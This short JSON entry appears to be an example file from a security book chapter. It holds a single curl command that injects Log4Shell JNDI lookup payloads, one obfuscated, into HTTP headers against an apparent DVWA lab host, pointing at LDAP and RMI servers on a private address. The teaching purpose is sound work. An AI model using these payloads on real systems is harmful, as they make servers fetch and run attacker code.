    "file": "examples/rev02/chapter07/C07-26.txt",
    "text": "curl -i --max-time 15 \\\n  -H \\\n'X-Api-Version: ${${lower:j}ndi:ldap://192.168.0.108:1389/b}' \\\n  -A '${jndi:rmi://192.168.0.108:1099/c}' \\\n  http://dvwa.ccc.com/"
  },
